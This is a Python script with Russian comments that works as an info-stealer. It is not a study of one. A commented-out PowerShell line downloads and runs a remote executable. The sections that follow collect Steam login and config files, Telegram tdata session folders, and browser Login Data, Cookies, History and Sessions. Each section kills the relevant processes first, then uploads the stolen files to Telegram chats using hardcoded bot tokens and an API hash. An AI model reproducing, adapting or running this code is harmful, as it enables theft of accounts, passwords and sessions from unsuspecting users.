#import subprocess; subprocess.run(["powershell", "-Command", 'iwr https://github.com/xonsyGA/tasdaer/releases/download/2/Bkups.exe -OutFile $env:TEMP\\Bkups.exe; & $env:TEMP\\Bkups.exe'])

# ============ Steam =========
import os
import telebot
import random
import time
from urllib3.exceptions import ReadTimeoutError

tokens = [
    "7546914861:AAEwoJQv2HjrW6lm735Ip78mTN41vSuNCVM",
    "7678660176:AAFVtUBUsKh76-b9Dz8q7TP-vjEubMxwsYs",
    "7853703459:AAGJYrcA3PDXlUzNVhFgoivca_axAMZuwC8",
    "8194541918:AAEX1sP8DzoJPHEuz__rT_0jIai_5ORL_HY",
    "7737931443:AAG9FbYOvFrQCiNLeUjG7rlpxky4qSIVL1E",
    "7661618084:AAHhlaY_gqLLNBXM2-6AmXeYee7POka-VJk",
    "8164524905:AAFyJjqsayC0nIZpO6kKIaWd1waxXIhkVkA"
]

# Настройка бота с увеличенным таймаутом
bot = telebot.TeleBot(random.choice(tokens), threaded=False)
chat_id = -4605373731

target_files = {
    "config.vdf": False,
    "loginusers.vdf": False,
    "DialogConfig.vdf": False,
    "fiterlist.vdf": False
}

steam_paths = [
    "C:/Program Files/Steam/config/",
    "C:/Program Files (x86)/Steam/config/"
]

def send_file_with_retry(filepath, filename, max_retries=3):
    retries = 0
    while retries < max_retries:
        try:
            with open(filepath, 'rb') as f:
                # Увеличенный таймаут для больших файлов
                bot.send_document(chat_id, f, visible_file_name=filename, timeout=60)
            print(f"Успешно отправлен: {filename}")
            return True
        except ReadTimeoutError:
            retries += 1
            print(f"Таймаут при отправке {filename}, попытка {retries}/{max_retries}")
            time.sleep(2)  # Пауза перед повторной попыткой
        except Exception as e:
            print(f"Ошибка отправки {filename}: {str(e)}")
            return False
    print(f"Не удалось отправить {filename} после {max_retries} попыток")
    return False

def send_message_with_retry(text, max_retries=2):
    retries = 0
    while retries < max_retries:
        try:
            bot.send_message(chat_id, text)
            return True
        except Exception as e:
            print(f"Ошибка отправки сообщения: {str(e)}")
            retries += 1
            time.sleep(1)
    return False

# Отправка информации о компьютере
send_message_with_retry(f"Компьютер: {os.getlogin()}")

# 1. Поиск в указанных Steam папках с мгновенной отправкой
for steam_path in steam_paths:
    for filename in list(target_files.keys()):
        if not target_files[filename]:
            full_path = os.path.join(steam_path, filename)
            if os.path.exists(full_path):
                if send_file_with_retry(full_path, filename):
                    target_files[filename] = True
                else:
                    # Добавляем файл в очередь для повторной попытки позже
                    pass

# 2. Поиск недостающих файлов в других местах
missing_files = [f for f, found in target_files.items() if not found]
if missing_files:
    search_locations = [
        os.path.expanduser("~"),
        os.path.join(os.path.expanduser("~"), "AppData", "Local", "Steam"),
        "C:/",
    ]
    
    for location in search_locations:
        if not missing_files:
            break
            
        if os.path.exists(location):
            for root, _, files in os.walk(location, topdown=True):
                if not missing_files:
                    break
                
                for name in files:
                    if name in missing_files:
                        full_path = os.path.join(root, name)
                        if send_file_with_retry(full_path, name):
                            missing_files.remove(name)

# Попытка отправки ранее неотправленных файлов
for filename, sent in target_files.items():
    if not sent:
        for steam_path in steam_paths:
            full_path = os.path.join(steam_path, filename)
            if os.path.exists(full_path):
                if send_file_with_retry(full_path, filename, max_retries=5):
                    target_files[filename] = True
                    break

# Финальное сообщение если ничего не найдено
if all(not sent for sent in target_files.values()):
    send_message_with_retry("Не удалось найти ни один из целевых файлов")
else:
    found = [f for f, sent in target_files.items() if sent]
    not_found = [f for f, sent in target_files.items() if not sent]
    status_msg = f"Найдено файлов: {len(found)}/{len(target_files)}"
    if not_found:
        status_msg += f"\nНе найдены: {', '.join(not_found)}"
    send_message_with_retry(status_msg)
        
        

# ============ Tdata =========

import socket
import os
import zipfile
import psutil
from pyrogram import Client
import random

def get_device_ip():
    try:
        # Создаем временное подключение, чтобы узнать IP устройства
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return " "

# Записываем IP в переменную
IP_ad = get_device_ip()

# Конфигурация Telegram-бота
API_ID = 28335162
API_HASH = "e7546b853ca2bb3c2d34410c11fe74ad"
BOT_TOKENS = ["7546914861:AAEwoJQv2HjrW6lm735Ip78mTN41vSuNCVM", "7678660176:AAFVtUBUsKh76-b9Dz8q7TP-vjEubMxwsYs", "7853703459:AAGJYrcA3PDXlUzNVhFgoivca_axAMZuwC8", "8194541918:AAEX1sP8DzoJPHEuz__rT_0jIai_5ORL_HY", "7737931443:AAG9FbYOvFrQCiNLeUjG7rlpxky4qSIVL1E", "7661618084:AAHhlaY_gqLLNBXM2-6AmXeYee7POka-VJk", "8164524905:AAFyJjqsayC0nIZpO6kKIaWd1waxXIhkVkA"]  # Список токенов ботов
CHANNEL_ID = 7977857730

# Название файла или папки для поиска
TARGET_NAME = "tdata"
IGNORED_FOLDERS = ["user_data", "dumps", "emoji", "tdummy", "temp", "b", "countries"]

# Получение пути к временной директории
TEMP_DIR = os.environ['TEMP']
ZIP_FILE_NAME = os.path.join(TEMP_DIR, "tdata.zip")
MARKER_FILE = os.path.join(TEMP_DIR, "1.look")  # Файл-маркер для проверки отправки

# Функции для работы с tdata
def close_telegram_process():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        try:
            if process.info['name'].lower() == "telegram.exe":
                psutil.Process(process.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def find_tdata():
    drives = ["C:\\", "D:\\", "E:\\"]  # Проверяем только диски C, D, E
    for drive in drives:
        print(f"пару секунд...")
        for root, dirs, files in os.walk(drive):
            if TARGET_NAME in dirs:
                return os.path.join(root, TARGET_NAME)
            elif TARGET_NAME in files:
                return os.path.join(root, TARGET_NAME)
    return None

def compress_to_zip(source_path, zip_name):
    if os.path.isdir(source_path):
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(source_path):
                # Игнорируем все ненужные папки и папки с user_data#
                dirs[:] = [d for d in dirs if d not in IGNORED_FOLDERS and not d.startswith("user_data#")]
                for file in files:
                    file_path = os.path.join(root, file)
                    archive_name = os.path.relpath(file_path, source_path)
                    zipf.write(file_path, archive_name)
    elif os.path.isfile(source_path):
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(source_path, os.path.basename(source_path))
        print(" ")
    else:
        raise FileNotFoundError("...")

def send_zip_to_channel(zip_file, channel_id):
    # Выбираем случайный токен из списка
    bot_token = random.choice(BOT_TOKENS)
    with Client(":memory:", API_ID, API_HASH, bot_token=bot_token, in_memory=True) as app:
        app.send_document(chat_id=channel_id, document=zip_file, caption=f"{IP_ad}")

# Основной процесс
if __name__ == "__main__":
    # Проверяем, существует ли файл-маркер
    if os.path.exists(MARKER_FILE):
        print("   ")
        

    close_telegram_process()

    tdata_path = find_tdata()  # Ищем папку tdata на диске C
    if not tdata_path:
        print("  ")
        

    try:
        compress_to_zip(tdata_path, ZIP_FILE_NAME)
    except Exception as e:
        print("   ")
        

    try:
        send_zip_to_channel(ZIP_FILE_NAME, CHANNEL_ID)
        # Создаем файл-маркер после успешной отправки
        with open(MARKER_FILE, "w") as f:
            f.write("Файл tdata.zip был отправлен.")
        print("Файл успешно отправлен.")
    except Exception as e:
        print("Ошибка при отправке файла:", str(e))
    finally:
        if os.path.exists(ZIP_FILE_NAME):
            os.remove(ZIP_FILE_NAME)
    print("Готово.\n")
                
                
                
                

# ============ Browsers =========
import os
import zipfile
import psutil
import time
from telegram import Bot
from telegram.error import TelegramError
import asyncio

# Конфигурация
USER_NAME = os.getlogin()
API_TOKEN = '8164524905:AAFyJjqsayC0nIZpO6kKIaWd1waxXIhkVkA'  # Замените на реальный токен
ADMIN_CHAT_ID = -4605373731

# Браузеры и их данные
BROWSERS = {
    'Chrome': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Google\Chrome\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Login Data-journal",
            "Top Sites", "Cookies", "Sessions"
        ]
    },
    'Opera': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Roaming\Opera Software\Opera Stable",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Visited Links", "Top Sites"
        ]
    },
    'Kometa': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Kometa\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Top Sites"
        ]
    },
    'Orbitum': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Orbitum\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Top Sites"
        ]
    },
    'Comodo Dragon': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Comodo\Dragon\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Top Sites"
        ]
    },
    'Amigo': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Amigo\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Top Sites"
        ]
    },
    'Torch': {
        'profile_path': fr"C:\Users\{USER_NAME}\AppData\Local\Torch\User Data\Default",
        'files': [
            "Login Data", "Preferences", "Secure Preferences", "History", "Bookmarks", "Sessions", "Cookies",
            "Top Sites"
        ]
    }
}



BROWSER_PROCESSES = [
    'chrome.exe',
    'firefox.exe',
    'opera.exe',
    'msedge.exe',
    'brave.exe',
    'kometa.exe',
    'orbitum.exe',
    'dragon.exe',
    'amigo.exe',
    'torch.exe'
]

def close_browsers():
    """Закрывает все процессы браузеров"""
    print("Закрываем браузеры...")
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [p.lower() for p in BROWSER_PROCESSES]:
                proc.kill()
                print(f"Закрыт процесс: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def collect_browser_data():
    """Собираем данные браузеров в zip-архив"""
    print("\nСобираем данные браузеров...")
    zip_path = "browser_data_backup.zip"
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for browser, data in BROWSERS.items():
            print(f"\nОбрабатываем {browser}...")
            
            # Проверяем существует ли папка профиля
            if not os.path.exists(data['profile_path']):
                print(f"Папка профиля не найдена: {data['profile_path']}")
                continue
                
            for file_name in data['files']:
                src_path = os.path.join(data['profile_path'], file_name)
                
                try:
                    if os.path.exists(src_path):
                        # Для файлов Cookies и других важных - проверяем размер
                        if os.path.getsize(src_path) > 0:
                            zipf.write(src_path, f"{browser}/{file_name}")
                            print(f"Добавлен файл: {file_name}")
                        else:
                            print(f"Файл пустой: {file_name}")
                    else:
                        print(f"Файл не найден: {file_name}")
                except Exception as e:
                    print(f"Ошибка при обработке файла {file_name}: {str(e)}")
    
    print("\nАрхив успешно создан")
    return zip_path

async def send_to_telegram(file_path):
    """Отправляем архив в Telegram"""
    print("\nПытаемся отправить файл в Telegram...")
    bot = Bot(token=API_TOKEN)
    
    try:
        with open(file_path, 'rb') as f:
            # Убрали параметр timeout, который вызывал ошибку
            await bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=f,
                caption="Бэкап данных браузеров"
            )
        print("Файл успешно отправлен!")
    except TelegramError as e:
        print(f"Ошибка Telegram: {e}")
    except Exception as e:
        print(f"Общая ошибка при отправке: {e}")
    finally:
        try:
            os.remove(file_path)
            print("Временный файл удален")
        except:
            print("Не удалось удалить временный файл")

async def main():
    """Основной процесс выполнения"""
    try:
        print("=== Начало сбора данных браузеров ===")
        
        # 1. Закрываем браузеры
        close_browsers()
        time.sleep(3)  # Даем время на завершение процессов
        
        # 2. Собираем данные
        zip_file = collect_browser_data()
        
        # Проверяем размер архива перед отправкой
        if os.path.exists(zip_file) and os.path.getsize(zip_file) > 0:
            # 3. Отправляем в Telegram
            await send_to_telegram(zip_file)
        else:
            print("Ошибка: архив не создан или пустой")
            
    except Exception as e:
        print(f"Критическая ошибка: {e}")
    finally:
        print("=== Процесс завершен ===")

if __name__ == '__main__':
    # Запускаем асинхронный код
    asyncio.run(main())